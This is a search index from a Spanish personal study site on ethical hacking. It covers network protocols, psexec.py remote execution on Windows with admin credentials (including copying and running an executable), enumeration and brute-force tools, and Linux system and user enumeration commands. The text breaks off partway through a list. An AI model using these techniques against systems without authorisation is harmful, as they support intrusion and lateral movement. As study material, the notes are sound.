{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"\u270d\ufe0f Repositorio de Apuntes de Ciberseguridad","text":"<p>\u00a1Hola! Soy Brian Lopez M (BrianLM), un entusiasta y aprendiz continuo en el vasto universo de la ciberseguridad. Bienvenido a mi santuario digital de notas, un lugar donde he volcado a\u00f1os de estudio, pr\u00e1ctica y curiosidad insaciable por entender c\u00f3mo funcionan los sistemas, y c\u00f3mo protegerlos.</p>"},{"location":"#el-viaje-de-un-hacker-etico","title":"\ud83d\udcd6 El Viaje de un Hacker \u00c9tico","text":"<p>Desde que descubr\u00ed el mundo del hacking \u00e9tico, me fascin\u00f3 la idea de usar el conocimiento t\u00e9cnico para proteger en lugar de da\u00f1ar. Este repositorio es la materializaci\u00f3n de ese viaje. Aqu\u00ed no solo encontrar\u00e1s conceptos te\u00f3ricos, sino tambi\u00e9n flujos de trabajo pr\u00e1cticos, comandos, scripts y <code>tips</code> que he acumulado al enfrentarme a desaf\u00edos reales en laboratorios <code>CTF</code> (Capture The Flag) y durante mi formaci\u00f3n (<code>En curso de subir los writeups de los CTFs</code>).</p> <p>Mi objetivo con este sitio es doble: 1.  Consolidar mi propio conocimiento: Tener un lugar centralizado para acceder y repasar cualquier tema, desde lo m\u00e1s b\u00e1sico hasta lo m\u00e1s complejo. 2.  Ayudar a la comunidad: Ofrecer un recurso de alta calidad para otros que, como yo, buscan adentrarse en este campo o simplemente necesitan una referencia r\u00e1pida para un tema espec\u00edfico.</p>"},{"location":"#desglosando-el-contenido","title":"\ud83d\uddfa\ufe0f Desglosando el Contenido","text":"<p>He estructurado este sitio de la forma m\u00e1s l\u00f3gica posible, siguiendo el ciclo de un ataque de penetraci\u00f3n, desde el reconocimiento inicial hasta la post-explotaci\u00f3n. Aqu\u00ed tienes un vistazo a lo que encontrar\u00e1s en las diferentes secciones:</p>"},{"location":"#1-enumeracion-y-footprinting","title":"1. Enumeraci\u00f3n y Footprinting","text":"<p>Esta es la fase de \"escuchar\". Aqu\u00ed profundizo en c\u00f3mo recopilar informaci\u00f3n pasiva y activa sobre un objetivo. Encontrar\u00e1s: - Escaneo de redes: Gu\u00edas detalladas para usar Nmap con scripts personalizados (<code>NSE</code>) para identificar servicios, versiones y vulnerabilidades. - Enumeraci\u00f3n de protocolos: Un enfoque especial en servicios como SMB y RPC, que a menudo revelan datos valiosos sobre los sistemas.</p>"},{"location":"#2-analisis-y-explotacion","title":"2. An\u00e1lisis y Explotaci\u00f3n","text":"<p>Una vez que sabes qu\u00e9 buscar, es momento de actuar. Esta secci\u00f3n se centra en la identificaci\u00f3n de vulnerabilidades y la explotaci\u00f3n de las mismas. He documentado mis t\u00e9cnicas para: - Sistemas Linux y Windows: Apuntes espec\u00edficos para cada sistema operativo, destacando sus diferencias y particularidades en t\u00e9rminos de seguridad. - Vector de ataque: Desde la ejecuci\u00f3n de comandos hasta la manipulaci\u00f3n de servicios comunes.</p>"},{"location":"#3-post-explotacion-y-escalada-de-privilegios","title":"3. Post-Explotaci\u00f3n y Escalada de Privilegios","text":"<p>Obtener una <code>shell</code> es solo el comienzo. Esta parte es crucial para entender c\u00f3mo mantener el acceso, moverse por la red y, lo m\u00e1s importante, elevar tus privilegios de usuario est\u00e1ndar a administrador o <code>root</code>. Aqu\u00ed incluyo: - T\u00e9cnicas de escalada de privilegios: Casos de estudio y metodolog\u00edas para explotar configuraciones incorrectas (<code>misconfigurations</code>), servicios vulnerables y otros fallos de seguridad. - Movimiento lateral: Estrategias para moverte de un sistema a otro dentro de una red comprometida.</p>"},{"location":"#4-herramientas-y-fundamentos","title":"4. Herramientas y Fundamentos","text":"<p>No solo se trata de la teor\u00eda; tambi\u00e9n es esencial dominar las herramientas. En esta secci\u00f3n, he recopilado mis notas sobre: - Transferencia de archivos: M\u00e9todos fiables y discretos para mover archivos entre sistemas. - <code>Upgrading Shells</code>: C\u00f3mo convertir una <code>shell</code> de comando b\u00e1sica en una <code>shell</code> interactiva, algo fundamental para la mayor\u00eda de los trabajos de post-explotaci\u00f3n.</p>"},{"location":"#un-llamado-a-la-comunidad","title":"\ud83d\ude4f Un Llamado a la Comunidad","text":"<p>Este proyecto es un trabajo en progreso. Mi compromiso es seguir actualiz\u00e1ndolo con cada nuevo aprendizaje. La ciberseguridad es un campo que evoluciona r\u00e1pidamente, y mantener estas notas al d\u00eda es mi forma de contribuir a la comunidad.</p> <p>Si encuentras alg\u00fan error, tienes una sugerencia o simplemente quieres compartir una idea, no dudes en contactarme. La retroalimentaci\u00f3n es clave para el crecimiento.</p> <p>\u00a1Gracias por visitar! Espero que este sitio se convierta en una herramienta tan valiosa para ti como lo es para m\u00ed.</p> <ul> <li>LinkedIn: Brian Lopez Medina</li> <li>GitHub: BrianLopezM99</li> <li>HackTheBox: BrianM #111663</li> </ul> <p>Puedes comenzar a explorar los temas usando el men\u00fa de navegaci\u00f3n superior.</p>"},{"location":"protocols/","title":"Protocols","text":""},{"location":"protocols/#que-es-un-protocolo","title":"\ud83d\udce1 \u00bfQu\u00e9 es un protocolo?","text":"<p>Un protocolo es un conjunto de reglas y normas que permite la comunicaci\u00f3n entre dispositivos en una red. Define c\u00f3mo se env\u00edan, reciben y procesan los datos para que la comunicaci\u00f3n sea eficiente y sin errores.</p> <p>\ud83d\udccc Ejemplo sencillo: Cuando dos personas hablan, deben usar un idioma com\u00fan (como espa\u00f1ol o ingl\u00e9s) para entenderse. En redes, los dispositivos usan protocolos para \"hablar\" entre s\u00ed.</p>"},{"location":"protocols/#tipos-de-protocolos-de-red","title":"\ud83d\udee0\ufe0f Tipos de [[protocolos de red]]","text":""},{"location":"protocols/#1-protocolos-de-comunicacion","title":"\ud83d\udcf6 1. Protocolos de Comunicaci\u00f3n","text":"<p>Permiten la transferencia de datos entre dispositivos. \u2705 HTTP / HTTPS \u2192 Comunicaci\u00f3n web. \u2705 FTP / SFTP \u2192 Transferencia de archivos. \u2705 SMTP / IMAP / POP3 \u2192 Correos electr\u00f3nicos.</p>"},{"location":"protocols/#2-protocolos-de-transporte","title":"\ud83d\udce1 2. Protocolos de Transporte","text":"<p>Aseguran que los datos lleguen correctamente. \u2705 TCP (Transmission Control Protocol) \u2192 Confiable, garantiza entrega de datos. \u2705 UDP (User Datagram Protocol) \u2192 R\u00e1pido, pero sin confirmaci\u00f3n de entrega.</p>"},{"location":"protocols/#3-protocolos-de-direccion-y-enrutamiento","title":"\ud83d\udccd 3. Protocolos de Direcci\u00f3n y Enrutamiento","text":"<p>Definen c\u00f3mo los dispositivos se identifican y comunican en la red. \u2705 IP (Internet Protocol) \u2192 Identifica dispositivos con direcciones IP. \u2705 ICMP (Internet Control Message Protocol) \u2192 Diagn\u00f3stico de red (usado en <code>ping</code>). \u2705 ARP (Address Resolution Protocol) \u2192 Asocia direcciones IP con direcciones MAC.</p>"},{"location":"protocols/#4-protocolos-de-seguridad","title":"\ud83d\udd10 4. Protocolos de Seguridad","text":"<p>Protegen la comunicaci\u00f3n. \u2705 TLS/SSL \u2192 Cifrado en la web. \u2705 IPSec \u2192 Cifrado de datos en redes privadas. \u2705 SSH \u2192 Acceso remoto seguro.</p>"},{"location":"protocols/#5-protocolos-de-comparticion-de-recursos","title":"\ud83d\udda7 5. Protocolos de Compartici\u00f3n de Recursos","text":"<p>Facilitan compartir archivos, impresoras y servicios en red. \u2705 SMB (Server Message Block) \u2192 Compartici\u00f3n de archivos en Windows. \u2705 NFS (Network File System) \u2192 Compartici\u00f3n en sistemas UNIX/Linux. \u2705 RDP (Remote Desktop Protocol) \u2192 Control remoto de escritorios Windows.</p>"},{"location":"referencia/","title":"Referencia","text":""},{"location":"referencia/#psexecpy-herramienta-para-ejecucion-remota-en-windows","title":"\ud83d\udd25 psexec.py - Herramienta para Ejecuci\u00f3n Remota en Windows \ud83d\udd25","text":"<p><code>psexec.py</code> es un script de Python que emula la funcionalidad de la herramienta PsExec de Sysinternals (ahora propiedad de Microsoft). PsExec es una herramienta muy utilizada para ejecutar comandos y programas de forma remota en sistemas Windows, especialmente \u00fatil para administradores de sistemas y en pruebas de penetraci\u00f3n.</p> <p>El script <code>psexec.py</code> permite realizar ejecuciones remotas de comandos en sistemas Windows sin necesidad de tener acceso f\u00edsico al sistema o de estar presente en la red de forma local.</p>"},{"location":"referencia/#que-hace-psexecpy","title":"\ud83d\udccc \u00bfQu\u00e9 hace <code>psexec.py</code>?","text":"<p><code>psexec.py</code> es una versi\u00f3n de c\u00f3digo abierto y simplificada del comando <code>PsExec</code> y permite lo siguiente:</p> <ol> <li>Ejecuci\u00f3n remota de comandos: Puedes ejecutar comandos en una m\u00e1quina remota de Windows, similar a como lo har\u00edas con el comando <code>cmd</code> o PowerShell.</li> <li>Transferencia de archivos: Puedes transferir archivos hacia o desde la m\u00e1quina remota mientras ejecutas los comandos.</li> <li>Ejecuci\u00f3n con privilegios elevados: Al igual que PsExec, puedes ejecutar comandos con privilegios de administrador (si la cuenta tiene los permisos adecuados).</li> <li>Recopilaci\u00f3n de informaci\u00f3n: Puedes ejecutar comandos de recopilaci\u00f3n de informaci\u00f3n en una m\u00e1quina Windows remota, como obtener detalles de red, lista de procesos, etc.</li> </ol>"},{"location":"referencia/#instalacion-y-requisitos","title":"\ud83d\udd39 Instalaci\u00f3n y Requisitos","text":"<p><code>psexec.py</code> suele encontrarse en repositorios de herramientas de pentesting como SecLists, Kali Linux, o en GitHub. Para ejecutarlo, necesitas tener Python instalado en tu sistema.</p> <ol> <li> <p>Instalaci\u00f3n de dependencias: Si no tienes Python, inst\u00e1lalo desde python.org.</p> </li> <li> <p>Dependencias adicionales: Algunas versiones del script pueden requerir dependencias como <code>impacket</code> para manejar la autenticaci\u00f3n y las conexiones SMB:</p> <p><code>bash pip install impacket</code></p> </li> </ol> <p>El m\u00f3dulo <code>psexec</code> de Metasploit se usa cuando tienes credenciales v\u00e1lidas de un usuario con privilegios administrativos en un sistema Windows que tiene SMB habilitado (puerto 445 abierto).</p>"},{"location":"referencia/#cuando-usar-psexec-en-smb","title":"\ud83d\udccc Cu\u00e1ndo usar <code>psexec</code> en SMB","text":"<p>Debes considerar <code>psexec</code> si se cumplen las siguientes condiciones:</p> <ol> <li>Acceso SMB habilitado \u2192 El puerto <code>445</code> est\u00e1 abierto en el objetivo.</li> <li>Credenciales v\u00e1lidas \u2192 Tienes un usuario y contrase\u00f1a con privilegios administrativos.</li> <li>Permisos suficientes \u2192 El usuario debe tener permisos para ejecutar procesos remotos en el sistema.</li> <li>Servicios SMB y ADMIN$ accesibles \u2192 El servicio <code>ADMIN$</code> debe estar disponible en el sistema objetivo.</li> </ol>"},{"location":"referencia/#uso-basico-de-psexecpy","title":"\ud83d\udd39 Uso B\u00e1sico de <code>psexec.py</code>","text":"<p>Para ejecutar el script, debes especificar la direcci\u00f3n IP de la m\u00e1quina remota, junto con el nombre de usuario y la contrase\u00f1a, o la clave de acceso si est\u00e1s utilizando autenticaci\u00f3n NTLM.</p>"},{"location":"referencia/#sintaxis-basica","title":"Sintaxis B\u00e1sica:","text":"<pre><code>python psexec.py &lt;usuario&gt;:&lt;contrase\u00f1a&gt;@&lt;IP objetivo&gt; &lt;comando a ejecutar&gt;\n</code></pre>"},{"location":"referencia/#ejemplo","title":"Ejemplo:","text":"<p>Si quieres ejecutar el comando <code>ipconfig</code> en la m\u00e1quina remota con la IP <code>192.168.1.100</code>, usa:</p> <pre><code>python psexec.py administrator:password@192.168.1.100 ipconfig\n</code></pre> <p>Esto ejecutar\u00e1 <code>ipconfig</code> en la m\u00e1quina remota y te devolver\u00e1 el resultado.</p>"},{"location":"referencia/#caracteristicas-y-opciones-comunes","title":"\ud83d\udd39 Caracter\u00edsticas y Opciones Comunes","text":"Opci\u00f3n Descripci\u00f3n <code>&lt;usuario&gt;:&lt;contrase\u00f1a&gt;</code> Nombre de usuario y contrase\u00f1a para autenticarte en el sistema remoto. <code>&lt;IP objetivo&gt;</code> Direcci\u00f3n IP del sistema remoto en el que deseas ejecutar el comando. <code>&lt;comando&gt;</code> El comando o script que deseas ejecutar de manera remota. <code>-hashes</code> Si se usa autenticaci\u00f3n NTLM, puedes especificar los hashes en lugar de la contrase\u00f1a."},{"location":"referencia/#ejemplo-de-ejecucion-remota-de-comandos","title":"\ud83d\udd39 Ejemplo de Ejecuci\u00f3n Remota de Comandos","text":"<ol> <li> <p>Ejecuci\u00f3n de un Comando Simple:</p> <p><code>bash python psexec.py admin:password@192.168.1.100 whoami</code></p> <p>Esto ejecutar\u00e1 el comando <code>whoami</code> en la m\u00e1quina remota para obtener el usuario actual.</p> </li> <li> <p>Transferir Archivos a una M\u00e1quina Remota: Puedes usar <code>psexec.py</code> para copiar un archivo desde tu m\u00e1quina local a una m\u00e1quina remota:</p> <p><code>bash python psexec.py admin:password@192.168.1.100 -c /ruta/a/archivo.exe</code></p> <p>El comando anterior copiar\u00e1 el archivo <code>archivo.exe</code> a la m\u00e1quina remota y lo ejecutar\u00e1.</p> </li> </ol>"},{"location":"referencia/#para-que-se-utiliza-psexecpy","title":"\ud83d\udd39 \u00bfPara qu\u00e9 se utiliza <code>psexec.py</code>?","text":"<p><code>psexec.py</code> es muy \u00fatil en entornos de pruebas de penetraci\u00f3n, auditor\u00edas de seguridad y administraci\u00f3n remota, ya que:</p> <ol> <li>Ejecuci\u00f3n Remota de Comandos: Permite ejecutar casi cualquier comando en un sistema Windows remoto.</li> <li>Tareas de Administraci\u00f3n de Sistemas: Ideal para administradores de sistemas que necesitan gestionar m\u00e1quinas remotas sin necesidad de acceder f\u00edsicamente a ellas.</li> <li>Exploits y Pentesting: Durante pruebas de penetraci\u00f3n, se puede utilizar <code>psexec.py</code> para ejecutar exploits o scripts maliciosos en sistemas comprometidos.</li> </ol>"},{"location":"referencia/#conclusion","title":"\ud83d\udd25 Conclusi\u00f3n","text":"<p><code>psexec.py</code> es una herramienta potente para la ejecuci\u00f3n remota de comandos en m\u00e1quinas Windows. Si bien es \u00fatil para administradores de sistemas, tambi\u00e9n es ampliamente utilizada en pruebas de penetraci\u00f3n para explotar vulnerabilidades en sistemas Windows sin necesidad de acceso f\u00edsico a la m\u00e1quina.</p>"},{"location":"enumeration/enumeration/","title":"Enumeration","text":""},{"location":"enumeration/enumeration/#que-es-la-enumeracion-en-pentesting","title":"\ud83d\udd0d \u00bfQu\u00e9 es la Enumeraci\u00f3n en Pentesting?","text":"<p>La [enumeraci\u00f3n] en pentesting es el proceso de recopilar informaci\u00f3n detallada sobre un sistema objetivo despu\u00e9s del escaneo inicial. Se centra en identificar recursos, servicios, usuarios, credenciales y otras configuraciones que puedan ser explotadas m\u00e1s adelante en la fase de explotaci\u00f3n.</p>"},{"location":"enumeration/enumeration/#objetivos-de-la-enumeracion","title":"\ud83d\udee0\ufe0f Objetivos de la Enumeraci\u00f3n","text":"<ol> <li>Identificar usuarios y grupos (ejemplo: enumeraci\u00f3n de usuarios en Active Directory).</li> <li>Descubrir servicios y sus versiones (ejemplo: SMB, FTP, HTTP).</li> <li>Recuperar informaci\u00f3n de redes (ejemplo: dominios, subdominios, rutas, dispositivos).</li> <li>Obtener credenciales d\u00e9biles o mal configuradas (ejemplo: hashes de contrase\u00f1as).</li> <li>Extraer informaci\u00f3n sobre permisos y configuraciones (ejemplo: privilegios de usuarios en bases de datos).</li> </ol>"},{"location":"enumeration/enumeration/#tipos-de-enumeracion-y-herramientas","title":"\ud83d\udccc Tipos de Enumeraci\u00f3n y Herramientas","text":""},{"location":"enumeration/enumeration/#1-enumeracion-de-usuarios-y-credenciales","title":"\ud83d\udd39 1. Enumeraci\u00f3n de Usuarios y Credenciales","text":"<ul> <li>T\u00e9cnicas: Enumerar usuarios v\u00e1lidos en sistemas como Windows (Active Directory), SSH o correos electr\u00f3nicos.</li> <li>Herramientas:<ul> <li><code>enum4linux</code> (SMB y Active Directory)</li> <li><code>rpcclient</code> (Enumeraci\u00f3n de usuarios en Windows)</li> <li><code>nmap --script smb-enum-users</code> (Usuarios SMB)</li> <li><code>hydra</code> o <code>medusa</code> (Ataques de fuerza bruta)</li> <li>[[Msfconsole\ud83d\udee1\ufe0f]] (modulos de enumeracion)</li> </ul> </li> </ul>"},{"location":"enumeration/enumeration/#2-enumeracion-de-servicios-y-puertos","title":"\ud83d\udd39 2. Enumeraci\u00f3n de Servicios y Puertos","text":"<ul> <li>T\u00e9cnicas: Identificar versiones y configuraciones de servicios como HTTP, SMB, FTP, etc.</li> <li>Herramientas:<ul> <li><code>nmap -sV</code> (Detecci\u00f3n de versiones de servicios)</li> <li><code>nikto</code> (Enumeraci\u00f3n de vulnerabilidades web)</li> <li><code>whatweb</code> (Detecci\u00f3n de tecnolog\u00edas web)</li> </ul> </li> </ul>"},{"location":"enumeration/enumeration/#3-enumeracion-de-recursos-compartidos-smb-nfs-ftp","title":"\ud83d\udd39 3. Enumeraci\u00f3n de Recursos Compartidos (SMB, NFS, FTP)","text":"<ul> <li>T\u00e9cnicas: Buscar archivos o carpetas accesibles en redes.</li> <li>Herramientas:<ul> <li><code>smbclient -L //IP</code> (Listar recursos compartidos en SMB)</li> <li><code>showmount -e IP</code> (Ver carpetas compartidas en NFS)</li> <li><code>ftp</code> (Ver archivos en servidores FTP abiertos)</li> </ul> </li> </ul>"},{"location":"enumeration/enumeration/#4-enumeracion-de-dns-y-subdominios","title":"\ud83d\udd39 4. Enumeraci\u00f3n de DNS y Subdominios","text":"<ul> <li>T\u00e9cnicas: Descubrir subdominios y registros DNS para identificar m\u00e1s puntos de entrada.</li> <li>Herramientas:<ul> <li><code>nslookup</code> / <code>dig</code> (Consultar registros DNS)</li> <li><code>theHarvester</code> (Recopilar informaci\u00f3n de dominios)</li> <li><code>sublist3r</code> (Enumeraci\u00f3n de subdominios)</li> </ul> </li> </ul>"},{"location":"enumeration/enumeration/#5-enumeracion-de-directorios-y-archivos-web","title":"\ud83d\udd39 5. Enumeraci\u00f3n de Directorios y Archivos Web","text":"<ul> <li>T\u00e9cnicas: Buscar directorios ocultos o archivos sensibles en servidores web.</li> <li>Herramientas:<ul> <li><code>gobuster dir -u http://victima.com -w wordlist.txt</code></li> <li><code>dirb</code> o <code>feroxbuster</code> (Fuerza bruta de directorios)</li> </ul> </li> </ul>"},{"location":"enumeration/enumeration/#importancia-de-la-enumeracion-en-un-pentest","title":"\ud83d\udd11 Importancia de la Enumeraci\u00f3n en un Pentest","text":"<ol> <li>Revela posibles vectores de ataque antes de explotar vulnerabilidades.</li> <li>Ayuda a encontrar credenciales y configuraciones d\u00e9biles.</li> <li>Facilita el reconocimiento de la estructura de la red objetivo.</li> <li>Permite planear mejor la fase de explotaci\u00f3n, enfoc\u00e1ndose en servicios vulnerables.</li> </ol>"},{"location":"enumeration/linux-enumeration/","title":"Linux Enumeration","text":"<p>Para enumerar informaci\u00f3n del sistema en Linux, hay varios comandos que puedes usar seg\u00fan el tipo de informaci\u00f3n que necesites. Aqu\u00ed tienes una lista organizada por categor\u00edas:</p>"},{"location":"enumeration/linux-enumeration/#informacion-general-del-sistema","title":"\ud83d\udd39 Informaci\u00f3n General del Sistema","text":""},{"location":"enumeration/linux-enumeration/#1-version-del-sistema-operativo","title":"1\ufe0f\u20e3 Versi\u00f3n del sistema operativo","text":"<pre><code>cat /etc/os-release\n</code></pre> <p>\ud83d\udd39 Muestra la versi\u00f3n y nombre de la distribuci\u00f3n.</p> <pre><code>uname -a\n</code></pre> <p>\ud83d\udd39 Muestra informaci\u00f3n general del sistema, incluyendo el kernel.</p> <pre><code>lsb_release -a\n</code></pre> <p>\ud83d\udd39 Muestra detalles completos del sistema (en distribuciones con <code>lsb</code>).</p> <pre><code>hostnamectl\n</code></pre> <p>\ud83d\udd39 Muestra informaci\u00f3n sobre el hostname y la versi\u00f3n del SO.</p>"},{"location":"enumeration/linux-enumeration/#informacion-del-kernel-y-cpu","title":"\ud83d\udd39 Informaci\u00f3n del Kernel y CPU","text":""},{"location":"enumeration/linux-enumeration/#2-ver-version-del-kernel","title":"2\ufe0f\u20e3 Ver versi\u00f3n del kernel","text":"<pre><code>uname -r\n</code></pre> <p>\ud83d\udd39 Muestra la versi\u00f3n exacta del kernel.</p> <pre><code>cat /proc/version\n</code></pre> <p>\ud83d\udd39 Muestra la versi\u00f3n del kernel y detalles del compilador.</p> <pre><code>dmesg | head -10\n</code></pre> <p>\ud83d\udd39 Muestra los primeros registros del arranque del kernel.</p>"},{"location":"enumeration/linux-enumeration/#3-informacion-del-procesador","title":"3\ufe0f\u20e3 Informaci\u00f3n del procesador","text":"<pre><code>lscpu\n</code></pre> <p>\ud83d\udd39 Muestra informaci\u00f3n detallada del CPU.</p> <pre><code>cat /proc/cpuinfo\n</code></pre> <p>\ud83d\udd39 Muestra detalles de cada n\u00facleo del procesador.</p> <pre><code>nproc\n</code></pre> <p>\ud83d\udd39 Muestra el n\u00famero de n\u00facleos disponibles.</p>"},{"location":"enumeration/linux-enumeration/#informacion-de-la-memoria","title":"\ud83d\udd39 Informaci\u00f3n de la Memoria","text":""},{"location":"enumeration/linux-enumeration/#4-ver-memoria-ram-instalada-y-en-uso","title":"4\ufe0f\u20e3 Ver memoria RAM instalada y en uso","text":"<pre><code>free -h\n</code></pre> <p>\ud83d\udd39 Muestra la memoria total, usada y disponible en formato legible.</p> <pre><code>cat /proc/meminfo\n</code></pre> <p>\ud83d\udd39 Muestra informaci\u00f3n detallada de la memoria.</p>"},{"location":"enumeration/linux-enumeration/#informacion-del-disco","title":"\ud83d\udd39 Informaci\u00f3n del Disco","text":""},{"location":"enumeration/linux-enumeration/#5-ver-espacio-en-disco","title":"5\ufe0f\u20e3 Ver espacio en disco","text":"<pre><code>df -h\n</code></pre> <p>\ud83d\udd39 Muestra el espacio usado y disponible en todas las particiones.</p> <pre><code>lsblk\n</code></pre> <p>\ud83d\udd39 Muestra la estructura de particiones y discos conectados.</p> <pre><code>fdisk -l\n</code></pre> <p>\ud83d\udd39 Muestra detalles de las particiones del disco.</p> <pre><code>du -sh /ruta/del/directorio\n</code></pre> <p>\ud83d\udd39 Muestra el tama\u00f1o de un directorio espec\u00edfico.</p>"},{"location":"enumeration/linux-enumeration/#informacion-de-los-dispositivos-y-hardware","title":"\ud83d\udd39 Informaci\u00f3n de los Dispositivos y Hardware","text":""},{"location":"enumeration/linux-enumeration/#6-ver-dispositivos-conectados","title":"6\ufe0f\u20e3 Ver dispositivos conectados","text":"<pre><code>lspci\n</code></pre> <p>\ud83d\udd39 Lista los dispositivos PCI (tarjetas de red, sonido, etc.).</p> <pre><code>lsusb\n</code></pre> <p>\ud83d\udd39 Lista los dispositivos USB conectados.</p> <pre><code>dmidecode -t system\n</code></pre> <p>\ud83d\udd39 Muestra informaci\u00f3n sobre el fabricante del sistema, modelo y n\u00famero de serie.</p> <pre><code>dmesg | grep -i usb\n</code></pre> <p>\ud83d\udd39 Muestra mensajes del sistema relacionados con dispositivos USB.</p>"},{"location":"enumeration/linux-enumeration/#informacion-de-usuarios-y-grupos","title":"\ud83d\udd39 Informaci\u00f3n de Usuarios y Grupos","text":""},{"location":"enumeration/linux-enumeration/#7-ver-usuarios-activos-en-el-sistema","title":"7\ufe0f\u20e3 Ver usuarios activos en el sistema","text":"<pre><code>who\n</code></pre> <p>\ud83d\udd39 Muestra los usuarios conectados actualmente.</p> <pre><code>w\n</code></pre> <p>\ud83d\udd39 Muestra usuarios activos y lo que est\u00e1n haciendo.</p> <pre><code>last\n</code></pre> <p>\ud83d\udd39 Muestra el historial de inicios de sesi\u00f3n.</p> <pre><code>getent passwd\n</code></pre> <p>\ud83d\udd39 Lista todos los usuarios del sistema.</p> <pre><code>getent group\n</code></pre> <p>\ud83d\udd39 Lista todos los grupos del sistema.</p>"},{"location":"enumeration/linux-enumeration/#informacion-de-red","title":"\ud83d\udd39 Informaci\u00f3n de Red","text":""},{"location":"enumeration/linux-enumeration/#8-ver-configuracion-de-red","title":"8\ufe0f\u20e3 Ver configuraci\u00f3n de red","text":"<pre><code>ip a\n</code></pre> <p>\ud83d\udd39 Muestra direcciones IP y estado de las interfaces de red.</p> <pre><code>ifconfig\n</code></pre> <p>\ud83d\udd39 Alternativa antigua para ver la configuraci\u00f3n de red.</p> <pre><code>netstat -tulnp\n</code></pre> <p>\ud83d\udd39 Muestra los puertos abiertos y los procesos que los est\u00e1n usando.</p> <pre><code>ss -tulnp\n</code></pre> <p>\ud83d\udd39 Similar a <code>netstat</code>, pero m\u00e1s r\u00e1pido y moderno.</p> <pre><code>ip r\n</code></pre> <p>\ud83d\udd39 Muestra la tabla de rutas del sistema.</p> <pre><code>cat /etc/resolv.conf\n</code></pre> <p>\ud83d\udd39 Muestra los servidores DNS configurados.</p>"},{"location":"enumeration/linux-enumeration/#procesos-y-servicios","title":"\ud83d\udd39 Procesos y Servicios","text":""},{"location":"enumeration/linux-enumeration/#9-ver-procesos-en-ejecucion","title":"9\ufe0f\u20e3 Ver procesos en ejecuci\u00f3n","text":"<pre><code>ps aux\n</code></pre> <p>\ud83d\udd39 Lista todos los procesos en ejecuci\u00f3n.</p> <pre><code>top\n</code></pre> <p>\ud83d\udd39 Muestra los procesos m\u00e1s activos en tiempo real.</p> <pre><code>htop\n</code></pre> <p>\ud83d\udd39 Alternativa m\u00e1s visual para ver procesos (requiere instalaci\u00f3n).</p>"},{"location":"enumeration/linux-enumeration/#ver-servicios-activos","title":"\ud83d\udd1f Ver servicios activos","text":"<pre><code>systemctl list-units --type=service\n</code></pre> <p>\ud83d\udd39 Lista los servicios en ejecuci\u00f3n en sistemas con <code>systemd</code>.</p> <pre><code>service --status-all\n</code></pre> <p>\ud83d\udd39 Muestra el estado de los servicios en sistemas sin <code>systemd</code>.</p>"},{"location":"enumeration/linux-enumeration/#enumerar-usuarios","title":"\ud83d\udd39 Enumerar Usuarios","text":"<p>Para enumerar usuarios y grupos en Linux, puedes usar varios comandos dependiendo de la informaci\u00f3n que necesites. Aqu\u00ed tienes los m\u00e1s importantes:</p>"},{"location":"enumeration/linux-enumeration/#1-listar-todos-los-usuarios-del-sistema","title":"1\ufe0f\u20e3 Listar todos los usuarios del sistema","text":"<pre><code>cat /etc/passwd\n</code></pre> <p>\ud83d\udd39 Muestra la lista de usuarios registrados en el sistema. Cada l\u00ednea tiene esta estructura:</p> <pre><code>usuario:x:UID:GID:informaci\u00f3n:casa:shell\n</code></pre> <p>Ejemplo:</p> <pre><code>root:x:0:0:root:/root:/bin/bash\n</code></pre> <p>\ud83d\udccc Importante:</p> <ul> <li><code>UID 0</code> es el usuario root.</li> <li>Los usuarios del sistema suelen tener <code>UID &lt; 1000</code>.</li> <li>Los usuarios normales tienen <code>UID \u2265 1000</code>.</li> </ul> <pre><code>getent passwd\n</code></pre> <p>\ud83d\udd39 Alternativa m\u00e1s flexible para listar usuarios.</p> <pre><code>awk -F':' '{ print $1}' /etc/passwd\n</code></pre> <p>\ud83d\udd39 Muestra solo los nombres de usuario.</p> <pre><code>cut -d: -f1 /etc/passwd\n</code></pre> <p>\ud83d\udd39 Otra forma de listar solo los nombres de usuario.</p>"},{"location":"enumeration/linux-enumeration/#usuarios-conectados","title":"\ud83d\udd39 Usuarios Conectados","text":""},{"location":"enumeration/linux-enumeration/#2-ver-quien-esta-conectado","title":"2\ufe0f\u20e3 Ver qui\u00e9n est\u00e1 conectado","text":"<pre><code>who\n</code></pre> <p>\ud83d\udd39 Muestra los usuarios actualmente conectados.</p> <pre><code>w\n</code></pre> <p>\ud83d\udd39 Similar a <code>who</code>, pero con m\u00e1s detalles.</p> <pre><code>whoami\n</code></pre> <p>\ud83d\udd39 Muestra el usuario actual.</p> <pre><code>id\n</code></pre> <p>\ud83d\udd39 Muestra el UID, GID y los grupos del usuario actual.</p> <pre><code>last\n</code></pre> <p>\ud83d\udd39 Muestra el historial de inicios de sesi\u00f3n.</p> <pre><code>lastlog\n</code></pre> <p>\ud83d\udd39 Muestra la \u00faltima vez que cada usuario inici\u00f3 sesi\u00f3n.</p>"},{"location":"enumeration/linux-enumeration/#enumerar-grupos","title":"\ud83d\udd39 Enumerar Grupos","text":""},{"location":"enumeration/linux-enumeration/#3-listar-todos-los-grupos-del-sistema","title":"3\ufe0f\u20e3 Listar todos los grupos del sistema","text":"<pre><code>cat /etc/group\n</code></pre> <p>\ud83d\udd39 Muestra todos los grupos en el sistema.</p> <pre><code>getent group\n</code></pre> <p>\ud83d\udd39 Alternativa para listar los grupos.</p> <pre><code>awk -F':' '{ print $1}' /etc/group\n</code></pre> <p>\ud83d\udd39 Muestra solo los nombres de los grupos.</p> <pre><code>cut -d: -f1 /etc/group\n</code></pre> <p>\ud83d\udd39 Otra forma de mostrar solo los nombres de los grupos.</p>"},{"location":"enumeration/linux-enumeration/#ver-grupos-de-un-usuario","title":"\ud83d\udd39 Ver Grupos de un Usuario","text":""},{"location":"enumeration/linux-enumeration/#4-listar-los-grupos-a-los-que-pertenece-un-usuario","title":"4\ufe0f\u20e3 Listar los grupos a los que pertenece un usuario","text":"<pre><code>groups &lt;usuario&gt;\n</code></pre> <p>\ud83d\udd39 Muestra los grupos de un usuario espec\u00edfico.</p> <pre><code>id &lt;usuario&gt;\n</code></pre> <p>\ud83d\udd39 Muestra el UID, GID y grupos del usuario.</p> <p>Ejemplo para el usuario <code>juan</code>:</p> <pre><code>id juan\n</code></pre> <p>Salida:</p> <pre><code>uid=1001(juan) gid=1001(juan) grupos=1001(juan),27(sudo),100(users)\n</code></pre> <p>\ud83d\udccc Notas:</p> <ul> <li>El usuario <code>root</code> pertenece al grupo <code>root (0)</code>.</li> <li>Si un usuario pertenece a <code>sudo</code> o <code>wheel</code>, puede ejecutar comandos como administrador.</li> 